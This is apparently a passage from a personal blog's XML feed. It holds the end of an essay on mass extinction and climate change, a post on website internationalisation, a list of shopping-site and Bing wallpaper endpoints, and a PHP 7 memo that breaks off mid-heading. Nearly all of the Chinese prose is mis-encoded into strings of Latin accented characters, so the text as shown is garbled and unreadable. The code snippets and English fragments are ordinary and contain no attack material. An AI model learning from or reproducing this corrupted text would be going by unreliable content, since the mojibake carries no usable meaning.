rel="noopener">ç™½å©çºªï¹£å¤è¿‘çºªç­ç»äº‹ä»¶</a>ä¸­ç­ç»ï¼Œä»…å­˜é¸Ÿå½¢æé¾™ï¼Œå³ä»Šå¤©çš„<a href="https://zh.wikipedia.org/wiki/%E9%B8%9F" target="_blank" rel="noopener">é¸Ÿç±»</a>ã€‚</p><p>åœ¨ç‰©ç§çš„ç­ç»ä¹‹åï¼Œéšä¹‹è€Œæ¥çš„å°±æ˜¯æ–°ç‰©ç§çš„è¯ç”Ÿä¸å‘å±•ã€‚äººç±»åœ¨è¿‘ä»£è¿›åŒ–ä¸­è„±é¢–è€Œå‡ºâ€”â€”ç”±å››è¶³è¿›åŒ–ä¸ºä¸¤è¶³ç›´ç«‹è¡Œèµ°ï¼Œåœ¨æ™ºåŠ›æ–¹é¢å–å¾—ç©ºå‰çš„è¿›åŒ–ï¼Œå†ç»èŒ¹æ¯›é¥®è¡€ã€åˆ€è€•ç«ç§ã€æ‰‹æè‚©æ‰›ã€æœºæ¢°åŒ–ã€ç”µæ°”åŒ–ã€ä¿¡æ¯åŒ–ï¼Œè¿›å…¥é«˜åº¦æ–‡æ˜é˜¶æ®µã€‚è™½ç„¶ç°åœ¨çš„äººç±»ä¸é‡ç”ŸåŠ¨ç‰©èµ¤èº«è‚‰æå‡ ä¹æ²¡æœ‰èƒœç®—ï¼Œä½†é€šè¿‡æ™ºåŠ›è¶³ä»¥æˆ˜èƒœå…¶å®ƒç‰©ç§ï¼Œç”šè‡³é©¯åŒ–å®ƒä»¬ã€‚äººç±»å·²ç»æœ‰å¾ˆå¼ºçš„ç¯å¢ƒé€‚åº”èƒ½åŠ›ï¼Œä¸Šè‡³ç ç©†æœ—ç›å³°ï¼Œä¸‹åˆ°é©¬é‡Œäºšçº³æµ·æ²Ÿï¼ŒåŒ—è¾¾æ ¼é™µå…°å²›ï¼Œå—æŠµå—æå¤§é™†ï¼Œç”šè‡³äºæœˆçƒã€ç«æ˜Ÿï¼Œæ— ä¸€æ²¡æœ‰äººç±»æ´»åŠ¨çš„è¸ªè¿¹ã€‚è¿™ä¸ªå†ç¨‹çœŸçš„æ˜¯ä»¤äººèµå¹ä¸å·²ã€‚</p><p>æˆ‘ä»¬çœŸçš„å¤ªå¹¸è¿äº†ï¼Œåœ¨æ•´ä¸ªæ¼”åŒ–è¿‡ç¨‹ä¸­ï¼Œç¨æœ‰åå·®ï¼Œè¿™ä¸ªä¸–ç•Œå°±å¯èƒ½å®Œå…¨æ˜¯å¦å¤–ä¸€ä¸ªæ ·å­ã€‚æˆ‘ä»¬ç°åœ¨æ‰€è®¤ä¸ºçš„ç†æ‰€å½“ç„¶ï¼Œä¸çŸ¥æ‰¿è’™äº†å¤šå¤§çš„ç¦è«åº‡ä½‘ï¼Œå€˜è‹¥äººç±»æ¯æŸäº†ç”Ÿå­˜å®¶å›­ï¼Œå¯èƒ½å†ä¹Ÿæ²¡æœ‰é€‚å®œäººç±»ç”Ÿå­˜çš„ç¯å¢ƒäº†ã€‚</p><p>é‚£ä¹ˆï¼Œä¸‹æ¬¡çš„å¤§ç­ç»ä¼šåœ¨ä»€ä¹ˆæ—¶å€™åˆ°æ¥ï¼Ÿäººç±»æœ€ç»ˆçš„å‘½è¿ä¼šæ˜¯æ€æ ·çš„å‘¢ï¼Ÿä¼šå­˜æ´»ä¸‹æ¥å—ï¼Ÿ</p><p>å¦‚ä»Šï¼Œäººç±»ç§‘æŠ€çš„å‘å±•å·²ç»å–å¾—äº†é•¿è¶³çš„è¿›æ­¥ï¼Œäººç±»ä¸å¤ªå¯èƒ½ä¼šåœ¨è¡Œæ˜Ÿæ’å‡»åœ°çƒä¸­ç­ç»ã€‚ç›®å‰äººç±»å·²ç»å¼€å§‹æ¢ç´¢å¤–å¤ªç©ºï¼Œæœ‰èƒ½åŠ›é¢„æµ‹æ’å‡»äº‹ä»¶ï¼Œåœ¨ä¸ä¹…çš„æœªæ¥ï¼Œäººç±»ææœ‰å¯èƒ½å®Œæˆå¤ªé˜³ç³»çš„<a href="https://zh.wikipedia.org/zh-cn/%E7%81%AB%E6%98%9F%E6%AE%96%E6%B0%91" target="_blank" rel="noopener">æ˜Ÿçƒæ®–æ°‘</a>ï¼Œå¤ªé˜³ç³»å¤–çš„ç”Ÿå‘½æ¢ç´¢äººç±»å¯èƒ½æ°¸è¿œæ‰¾ä¸åˆ°ç­”æ¡ˆã€‚è¿™ä¸ªæ•…äº‹æœ€ç»ˆä¼šæ˜¯æ€æ ·çš„ç»“å±€ï¼Œä½ æˆ‘éƒ½ä¸å¾—è€ŒçŸ¥ï¼Œæˆ‘ä»¬æ‰€èƒ½åšçš„ï¼Œåªæœ‰ä¸è¦äº²æ‰‹æ¯æ‰å®¶å›­å§ã€‚</p><p>æœ€è¿‘çš„<a href="https://news.un.org/en/story/2019/12/1052661" target="_blank" rel="noopener">è”åˆå›½æŠ¥å‘Š</a>æŒ‡å‡ºï¼Œè¿‘åå¹´æ˜¯æœ‰è®°å½•ä»¥æ¥æœ€çƒ­åå¹´ã€‚äººç±»çš„å‘å±•ä¾èµ–äºç»æµçš„å‘å±•ï¼Œç»æµçš„å‘å±•åˆä¾èµ–äºèƒ½æºï¼Œæ›´å¤šçš„èƒ½æºæ¶ˆè€—å¯¼è‡´äº†å…¨çƒå˜æš–ã€‚æ°”å€™å˜åŒ–ä¼¼ä¹ä¸äººç±»çš„å‘å±•æ˜¯çŸ›ç›¾çš„ï¼Œç°åœ¨æ°”å€™å·²ç»å‘å‡ºäº†è­¦å‘Šï¼Œæˆ‘ä»¬è¿˜è¿œæ²¡æœ‰åˆ°å£®å£«æ–­è…•çš„åœ°æ­¥ï¼Œæˆ‘ä»¬æ˜¯æ—¶å€™æ”¾ç¼“è„šæ­¥ï¼Œæ€è€ƒä¸€ä¸‹å¦‚ä½•åœ¨å‘å±•ç»æµçš„åŒæ—¶å…¼é¡¾ç¯å¢ƒï¼Œè¿™éœ€è¦å„å›½æ”¿åºœå‡ºå°æ”¿ç­–æ¥å¤§åŠ›æ¨åŠ¨èƒ½æºçš„å‡çº§ï¼Œä¸­ç¾ä¸¤å›½ä½œä¸ºæœ€å¤§çš„ç¢³æ’æ”¾å›½ï¼Œä¹Ÿæœ‰è´£ä»»å¸®åŠ©ä¸€äº›æ¬ å‘è¾¾å›½å®¶å‘å±•ç»æµã€‚å·´è¥¿ä¸ºäº†å°†æ›´å¤šçš„ç‰›è‚‰å‡ºå£åˆ°ä¸­å›½ï¼Œç ä¼ã€ç„šçƒ§äºšé©¬é€Šé›¨æ—ä»¥æ‰©å¤§ç‰§åœºï¼Œä»è€Œå¯¼è‡´äº†<a href="https://zh.wikipedia.org/zh-cn/2019%E5%B9%B4%E4%BA%9A%E9%A9%AC%E5%AD%99%E9%9B%A8%E6%9E%97%E9%87%8E%E7%81%AB" target="_blank" rel="noopener">2019 å¹´é›¨æ—å¤§ç«</a>ï¼Œå¼•å‘å›½é™…å…³æ³¨ã€‚äºšé©¬é€Šé›¨æ—å·ç§°â€œåœ°çƒä¹‹è‚ºâ€ï¼Œåœ¨ç”Ÿæ€åœˆæœ‰ç€ä¸¾è¶³è½»é‡çš„åœ°ä½ï¼Œé›¨æ—å—æŸå°†å¯¼è‡´ç”Ÿæ€ä¸æ°”å€™çš„è¿›ä¸€æ­¥æ¶åŒ–ã€‚æˆ‘ä»¬ä¸åº”è¯¥ä¸€é¢äº«å—é›¨æ—å¸¦ç»™æˆ‘ä»¬çš„é€‚å®œæ°”å€™ä¸å·´è¥¿ç‰›è‚‰çš„åŒæ—¶ï¼Œä¸€é¢åœ¨é›¨æ—å—æŸæ—¶æŒ‡è´£å½“åœ°å†œæ°‘ï¼Œä»–ä»¬ä¹Ÿéœ€è¦ç”Ÿå­˜ï¼Œä¹Ÿéœ€è¦ç»æµå‘å±•ï¼Œé›¨æ—éœ€è¦å…¨äººç±»çš„å‘µæŠ¤ã€‚</p><p>æœ€åï¼Œå®‰åˆ©ä¸€äº› BBC é«˜åˆ†çºªå½•ç‰‡ï¼Œæˆ‘ä»¬æˆ–è®¸èƒ½ä»è¿™äº›ç”Ÿå­˜å¤§å¸ˆä¸­å­¦åˆ°ä¸€äº›ç”Ÿå­˜æŠ€èƒ½ï¼Œä¹Ÿè®©æˆ‘ä»¬å¾—ä»¥å…³æ³¨æ—¥ç›Šä¸¥å³»çš„ç”Ÿæ€é—®é¢˜</p><ul><li>ã€Šæˆ‘ä»¬çš„æ˜Ÿçƒã€‹</li><li>ã€Šåœ°çƒè„‰åŠ¨ã€‹</li><li>ã€Šè“è‰²æ˜Ÿçƒã€‹</li><li>ã€Šå†°å†»æ˜Ÿçƒã€‹</li><li>ã€Šå—å¤ªå¹³æ´‹ã€‹</li><li>ã€Šç”Ÿå‘½ã€‹</li><li>ã€ŠçŒæ•ã€‹</li><li>ã€Šéæ´²ã€‹</li><li>ã€Šç‹æœã€‹</li><li>ã€Šä¸ƒä¸ªä¸–ç•Œï¼Œä¸€ä¸ªæ˜Ÿçƒã€‹</li></ul><hr><p>ç›¸å…³é˜…è¯»</p><ol><li><a href="https://www.unenvironment.org/interactive/emissions-gap-report/2019/" target="_blank" rel="noopener">Emissions Gap Report 2019</a></li><li><a href="https://wedocs.unep.org/bitstream/handle/20.500.11822/30798/EGR19ESCH.pdf" target="_blank" rel="noopener">2019 å¹´ã€Šç¢³æ’æ”¾å·®è·æŠ¥å‘Šã€‹ - è”åˆå›½è§„åˆ’ç½²</a></li><li><a href="https://www.carbonbrief.org/mapped-worlds-coal-power-plants" target="_blank" rel="noopener">ä¸–ç•Œç«åŠ›å‘ç”µå‚åœ°å›¾</a></li><li><a href="https://www.zhihu.com/question/280876600/answer/429905382" target="_blank" rel="noopener">éœ¸ç‹é¾™å‰é¢ä¸¤åªå°æ‰‹æ‰‹æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿ - Heimerdingerçš„å›ç­”</a></li><li><a href="https://www.zhihu.com/question/52115602/answer/141762022" target="_blank" rel="noopener">åœ°çƒä¸Šæœ‰å“ªäº›ç»†æ€ææä¹‹äº‹ï¼Ÿ - å¶å±±Shan Yeçš„å›ç­”</a></li><li><a href="https://neal.fun/deep-sea/" target="_blank" rel="noopener">The Deep Sea</a></li><li><a href="https://neal.fun/size-of-space/" target="_blank" rel="noopener">The Size of Space</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å½±åƒå¿— </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆç«™ç‚¹å›½é™…åŒ–</title>
      <link href="/post/website-i18n/"/>
      <url>/post/website-i18n/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9lnhdm7prj30rs0dp75q.jpg" alt=""></p><a id="more"></a><blockquote><p><em>æœ¬æ–‡åŸºäºä¸ªäººæœ‰é™çš„å›½é™…åŒ–ç»éªŒæ€è€ƒè€Œå¾—ï¼Œæœªç»å®Œæ•´å®é™…é¡¹ç›®éªŒè¯ï¼Œä»…ä¾›å‚è€ƒã€‚</em></p></blockquote><p>å¾ˆå¤šé¡¹ç›®åœ¨æ‹“å±•æµ·å¤–ä¸šåŠ¡æ—¶å¼€å§‹å¯¹ä»£ç è¿›è¡Œå›½é™…åŒ–æ”¹é€ ï¼Œä½†ç»å¸¸åœ¨è¿™ä¸ªæ—¶å€™è¦å¿è¿˜æŠ€æœ¯å€ºï¼Œè¢«æçš„ç„¦å¤´çƒ‚é¢ï¼Œé‚£ä¹ˆï¼Œå›½é™…åŒ–åœ¨ä»€ä¹ˆæ—¶å€™åšæœ€åˆé€‚ï¼Œåˆè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><h1 id="When"><a href="#When" class="headerlink" title="When"></a>When</h1><p>é¡¹ç›®åº”è¯¥ä»ä¸€å¼€å§‹å°±åšå¥½å›½é™…åŒ–çš„å‡†å¤‡ï¼Œè¿™å¹¶ä¸ä¼šè®©ä½ æŠ•å…¥å¤ªå¤šï¼Œä½†ä¼šè®©ä½ åœ¨æœªæ¥æ”¶ç›Šé¢‡ä¸°ã€‚</p><h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><h2 id="è¯­è¨€"><a href="#è¯­è¨€" class="headerlink" title="è¯­è¨€"></a>è¯­è¨€</h2><p>ä¸è¦åœ¨ä»£ç ä¸­ç¡¬ç¼–ç ä»»ä½•è¯­è¨€ï¼Œåº”è¯¥ç‹¬ç«‹è¯­è¨€åŒ…å¤„ç†ã€‚å±•ç¤ºæ—¶å¯é€šè¿‡ç”¨æˆ·é¢„è®¾è¯­è¨€ã€æµè§ˆå™¨ header <code>Accept-Language</code>å­—æ®µå†³å®šæ˜¾ç¤ºè¯­è¨€ã€‚</p><p>ä½ ä¹Ÿå¯ä»¥åœ¨<a href="https://i18ns.com/" target="_blank" rel="noopener">è¯¥ç½‘ç«™</a>è·å–æŸç§è¯­è¨€çš„å¤šè¯­è¨€ç¿»è¯‘ï¼Œé…ç½®ä¸º Alfred å·¥ä½œæµä¼šè¿›ä¸€æ­¥æå‡ä½“éªŒã€‚</p><h2 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h2><p>ç»Ÿä¸€ä½¿ç”¨ UTC æ—¶åŒºå­˜å‚¨æ—¶é—´ï¼Œç„¶ååœ¨æ˜¾ç¤ºæ—¶ï¼Œå…ˆåˆ¤æ–­ç”¨æˆ·é¢„è®¾æ—¶åŒºï¼ŒæœªçŸ¥åˆ™å¯æ ¹æ® IP æ˜¾ç¤ºã€‚äº¦å¯åœ¨é‚®ä»¶ç­‰åœºæ™¯ç›´æ¥è¡¨æ˜æ—¶é—´å’Œæ—¶åŒºï¼Œå¦‚è‹¹æœçš„é€šçŸ¥é‚®ä»¶æ—¶é—´<code>November 24, 2019, 3:20 PM PST</code>ã€‚</p><h2 id="æ‰‹æœºå·"><a href="#æ‰‹æœºå·" class="headerlink" title="æ‰‹æœºå·"></a>æ‰‹æœºå·</h2><p>ç”±å›½å®¶ç å’Œæ‰‹æœºå·ä¸¤å­—æ®µç»„æˆï¼Œä»…åœ¨å•ä¸€å›½å®¶å­˜åœ¨ä¸šåŠ¡æ—¶ï¼Œå¯éšè—å¹¶è®¾å®šé»˜è®¤å›½å®¶ç ï¼Œå¾…æ‹“å±•æµ·å¤–ä¸šåŠ¡æ—¶å†è¡Œå¼€æ”¾ï¼Œä¸ºå›½é™…åŒ–åšå¥½å……è¶³çš„å‡†å¤‡ã€‚</p><h2 id="å›½å®¶-åœ°åŒºåˆ—è¡¨äº‰è®®"><a href="#å›½å®¶-åœ°åŒºåˆ—è¡¨äº‰è®®" class="headerlink" title="å›½å®¶/åœ°åŒºåˆ—è¡¨äº‰è®®"></a>å›½å®¶/åœ°åŒºåˆ—è¡¨äº‰è®®</h2><p>ç”±äºå½“å‰éƒ¨åˆ†å›½å®¶çš„é¢†åœŸä¸»æƒå­˜åœ¨äº‰è®®ï¼Œç¨æœ‰ä¸æ…å¯èƒ½ä¼šé¢ä¸´ä¸¥é‡çš„æ”¿ç­–é£é™©ï¼Œä¸ºäº†è§„é¿é£é™©ï¼Œå¯ä»¥é‡‡ç”¨ä¸‹è¿°ä¸¤ç§æ–¹å¼ä»¥é¿å…ä¸»æƒæ¦‚å¿µï¼š</p><ol><li>ä»¥ã€ä½ç½®/Locationã€‘æ¥æ›¿ä»£ï¼Œå¦‚ Windows çš„è¯­è¨€/åœ°åŒºè®¾ç½®</li><li>ä»¥ã€å›½å®¶/åœ°åŒº(Country or region)ã€‘æ¥æ›¿ä»£ï¼Œå¦‚<a href="https://www.apple.com/choose-your-country/" target="_blank" rel="noopener">è‹¹æœçš„ç½‘ç«™</a></li></ol><h2 id="çŠ¶æ€è¡¨ç¤º"><a href="#çŠ¶æ€è¡¨ç¤º" class="headerlink" title="çŠ¶æ€è¡¨ç¤º"></a>çŠ¶æ€è¡¨ç¤º</h2><p>ä»¥ä½æ ‡è¡¨ç¤ºï¼Œå¦‚ 1Byte å«æœ‰ 8bitï¼Œæ¯ bit åˆå¯ä»¥è¡¨ç¤ºä¸¤ç§çŠ¶æ€ï¼Œå¦‚æ€§åˆ«ã€æ˜¯å¦åœ¨çº¿ã€æ•°æ®æ˜¯å¦å¯è§ç­‰æ˜ç¡®äºŒå€¼çŠ¶æ€ã€‚è¿™ç§æ–¹å¼æ˜“äºæ‰©å……ã€èŠ‚çœç©ºé—´ã€é™å®šä¸¤ç§çŠ¶æ€ï¼Œå¦‚æœæœªæ¥æŸä¸ªçŠ¶æ€éœ€è¦æ›´å¤šçš„å€¼è¡¨ç¤ºï¼Œè¿˜å¯ä»¥æå–ç‹¬ç«‹è¡¨ç¤ºã€‚</p><h2 id="ä»£ç ç»“æ„"><a href="#ä»£ç ç»“æ„" class="headerlink" title="ä»£ç ç»“æ„"></a>ä»£ç ç»“æ„</h2><p>éƒ¨åˆ†åœ°åŒºä¼šæœ‰äº›ç‰¹åˆ«æ´»åŠ¨ï¼Œå¦‚ä¸­å›½å†œå†æ–°å¹´ï¼Œå› æ­¤ï¼Œæˆ‘è®¤ä¸ºæ­¤æ—¶åº”è¯¥æå–ä¸€å¥—åŸºç¡€æ ¸å¿ƒä»£ç ï¼Œç„¶åå„åœ°åŒºæ ¹æ®è¯¥æ ¸å¿ƒä»£ç å®ç°ä¸šåŠ¡è‡ªå®šä¹‰ï¼Œå¦‚æ ¸å¿ƒä»£ç åŒ…æ‹¬æ–°äº§å“æˆ–æ–°åŠŸèƒ½åœ¨å…¨çƒçš„å‘å¸ƒï¼Œè€Œåœ°åŒºä»£ç åˆ™å¤„ç†è¯¥åœ°åŒºçš„æœ¬åœ°åŒ–ä¸šåŠ¡ã€‚</p><h2 id="ISO-æ ‡å‡†"><a href="#ISO-æ ‡å‡†" class="headerlink" title="ISO æ ‡å‡†"></a>ISO æ ‡å‡†</h2><p>å»ºç«‹ä¸€å¥—å…¨çƒé€šç”¨çš„æ ‡å‡†å¯¹æˆ‘ä»¬çš„ç»´æŠ¤ä¼šæœ‰å¾ˆå¤§çš„ä¾¿åˆ©ã€‚è¯¥éƒ¨åˆ†å¯æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« â€”â€”<a href="https://blog.shixinyu.space/post/standard-list">å¸¸ç”¨ ISO æ ‡å‡†åˆ—è¡¨</a>ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.xiaohui.com/weekly/software-and-politics.htm" target="_blank" rel="noopener">å¦‚ä½•è§„é¿è½¯ä»¶å¼€å‘ä¸­çš„å¤§ä¸­ååŒºæ”¿æ²»çº¢çº¿é—®é¢˜ - ç¨‹åºå‘˜å°è¾‰</a></li><li><a href="https://book.douban.com/subject/25982663/" target="_blank" rel="noopener">Modern PHP</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> i18n </tag>
            
            <tag> å›½é™…åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API æ±‡æ€»</title>
      <link href="/post/api-collect/"/>
      <url>/post/api-collect/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9kpdmizt7j30tw0jgwhm.jpg" alt=""></p><a id="more"></a><h1 id="äº¬ä¸œå•†å“ä»·æ ¼"><a href="#äº¬ä¸œå•†å“ä»·æ ¼" class="headerlink" title="äº¬ä¸œå•†å“ä»·æ ¼"></a>äº¬ä¸œå•†å“ä»·æ ¼</h1><p>å•†å“<code>https://item.jd.com/7892099.html</code>å¯¹åº”çš„ä»·æ ¼æ¥å£åœ°å€ä¸º<code>https://p.3.cn/prices/mgets?skuIds=J_7892099</code></p><p>è¿”å›å‚æ•°ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"cbf"</span>: <span class="string">"0"</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"J_7892099"</span>,</span><br><span class="line">    <span class="attr">"m"</span>: <span class="string">"8999.00"</span>,</span><br><span class="line">    <span class="attr">"op"</span>: <span class="string">"7649.00"</span>,</span><br><span class="line">    <span class="attr">"p"</span>: <span class="string">"6999.00"</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>op</code>ä¸ºåˆ’çº¿ä»·ï¼Œ<code>p</code>ä¸ºå½“å‰ä»·ï¼Œ<code>m</code>å«ä¹‰æœªçŸ¥</p><h1 id="äº¬ä¸œæœç´¢è”æƒ³è¯"><a href="#äº¬ä¸œæœç´¢è”æƒ³è¯" class="headerlink" title="äº¬ä¸œæœç´¢è”æƒ³è¯"></a>äº¬ä¸œæœç´¢è”æƒ³è¯</h1><p>URL: <code>https://dd-search.jd.com/?terminal=pc&amp;newjson=1&amp;ver=2&amp;zip=1&amp;key=iphone11 PRO MAX</code><br>âš ï¸ï¼šéœ€è®¾å®š header <code>Referer = &#39;https://www.jd.com/&#39;</code></p><h1 id="æ·˜å®å•†å“æœç´¢å»ºè®®"><a href="#æ·˜å®å•†å“æœç´¢å»ºè®®" class="headerlink" title="æ·˜å®å•†å“æœç´¢å»ºè®®"></a>æ·˜å®å•†å“æœç´¢å»ºè®®</h1><p>URL: <code>https://suggest.taobao.com/sug?code=utf-8&amp;q=iphone11</code></p><h1 id="Bing-å£çº¸"><a href="#Bing-å£çº¸" class="headerlink" title="Bing å£çº¸"></a>Bing å£çº¸</h1><p>URL: <code>https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;nc=1572500909531&amp;pid=hp&amp;FORM=BEHPTB&amp;video=1</code></p><hr><p>ä¸€äº›é¡µé¢å¯èƒ½ç¡®å®éœ€è¦æ¨¡æ‹Ÿæµè§ˆå™¨æ‰èƒ½æ­£å¸¸è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <a href="https://github.com/puppeteer/puppeteer" target="_blank" rel="noopener">Puppeteer</a> æ— å¤´æµè§ˆå™¨æ¥æ¨¡æ‹Ÿã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPå¤‡å¿˜å½•</title>
      <link href="/post/php-guide/"/>
      <url>/post/php-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9koq37pe3j30jg0a8gm7.jpg" alt=""></p><a id="more"></a><h1 id="PHPçš„ä¸€äº›ç‰¹æ€§"><a href="#PHPçš„ä¸€äº›ç‰¹æ€§" class="headerlink" title="PHPçš„ä¸€äº›ç‰¹æ€§"></a>PHPçš„ä¸€äº›ç‰¹æ€§</h1><p>å®˜æ–¹è¯´æ˜ï¼š<a href="https://www.php.net/manual/zh/migration70.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration70.new-features.php</a></p><h2 id="ä¸¥æ ¼æ¨¡å¼"><a href="#ä¸¥æ ¼æ¨¡å¼" class="headerlink" title="ä¸¥æ ¼æ¨¡å¼"></a>ä¸¥æ ¼æ¨¡å¼</h2><blockquote><p>php7.0+</p></blockquote><p><code>declare(strict_types=1);</code><br>âš ï¸è¯¥å£°æ˜æŒ‡ä»¤å¿…é¡»æ”¾åœ¨æ–‡ä»¶çš„é¡¶éƒ¨ã€‚</p><h2 id="æ‰¹é‡ä½¿ç”¨-use"><a href="#æ‰¹é‡ä½¿ç”¨-use" class="headerlink" title="æ‰¹é‡ä½¿ç”¨ use"></a>æ‰¹é‡ä½¿ç”¨ use</h2><blockquote><p>php7.0+</p></blockquote><p><code>use app\models\{Area, Category};</code></p><h2 id="NULL-åˆå¹¶æ“ä½œç¬¦"><a href="#NULL-åˆå¹¶æ“ä½œç¬¦" class="headerlink" title="NULL åˆå¹¶æ“ä½œç¬¦"></a>NULL åˆå¹¶æ“ä½œç¬¦</h2><p><code>$a ?? $b ?? $c;</code> ä»å·¦å¾€å³ç¬¬ä¸€ä¸ªå­˜åœ¨ä¸”ä¸ä¸º NULL çš„æ“ä½œæ•°ã€‚å¦‚æœéƒ½æ²¡æœ‰å®šä¹‰ä¸”ä¸ä¸º NULLï¼Œåˆ™è¿”å› NULL</p><h2 id="å®šä¹‰å¸¸é‡æ•°ç»„"><a href="#å®šä¹‰å¸¸é‡æ•°ç»„" class="headerlink" title="å®šä¹‰å¸¸é‡æ•°ç»„"></a>å®šä¹‰å¸¸é‡æ•°ç»„</h2><blockquote><p>php7.0+</p></blockquote><p>æ–¹å¼ä¸€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'ANIMALS'</span>, [</span><br><span class="line">    <span class="string">'dog'</span>,</span><br><span class="line">    <span class="string">'cat'</span>,</span><br><span class="line">    <span class="string">'bird'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ANIMALS[<span class="number">1</span>]; <span class="comment">// è¾“å‡º "cat"</span></span><br></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">const</span> ANIMALS = [</span></span><br><span class="line"><span class="php">    <span class="string">'dog'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'cat'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'bird'</span></span></span><br><span class="line"><span class="php">];</span></span><br></pre></td></tr></table></figure><h2 id="å¤ªç©ºèˆ¹æ“ä½œç¬¦"><a href="#å¤ªç©ºèˆ¹æ“ä½œç¬¦" class="headerlink" title="å¤ªç©ºèˆ¹æ“ä½œç¬¦"></a>å¤ªç©ºèˆ¹æ“ä½œç¬¦</h2><blockquote><p>php7.0+</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 0</span></span><br><span class="line">echo <span class="number">1</span> &lt;=&gt; <span class="number">2</span>; <span class="comment">// -1</span></span><br><span class="line">echo <span class="number">2</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h2 id="æ•´æ•°é™¤æ³•å‡½æ•°"><a href="#æ•´æ•°é™¤æ³•å‡½æ•°" class="headerlink" title="æ•´æ•°é™¤æ³•å‡½æ•°"></a>æ•´æ•°é™¤æ³•å‡½æ•°</h2><blockquote><p>php7.0+</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="built_in">int</span>div(<span class="number">10</span>, <span class="number">3</span>)); <span class="comment">// int(3)</span></span><br></pre></td></tr></table></figure><h2 id="æ”¯æŒå¤šä¸ªå¼‚å¸¸å¤„ç†"><a href="#æ”¯æŒå¤šä¸ªå¼‚å¸¸å¤„ç†" class="headerlink" title="æ”¯æŒå¤šä¸ªå¼‚å¸¸å¤„ç†"></a>æ”¯æŒå¤šä¸ªå¼‚å¸¸å¤„ç†</h2><blockquote><p>php5.5+</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Error | <span class="keyword">Exception</span> | Throwable $e) &#123;</span><br><span class="line">    var_dump(<span class="string">'Error'</span>, $e-&gt;getMessage(), $e-&gt;getCode());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123; <span class="comment">// Code within the finally block will always be executed after the try and catch blocks</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"First finally.\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>PHP Bug å®˜æ–¹ä¸»é¡µ <a href="https://bugs.php.net/index.php" target="_blank" rel="noopener">https://bugs.php.net/index.php</a></p><h2 id="PHP-7-1-ç‰ˆæœ¬ä»¥ä¸Š-json-encode-ç¼–ç æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜"><a href="#PHP-7-1-ç‰ˆæœ¬ä»¥ä¸Š-json-encode-ç¼–ç æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜" class="headerlink" title="PHP 7.1 ç‰ˆæœ¬ä»¥ä¸Š json_encode ç¼–ç æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜"></a>PHP 7.1 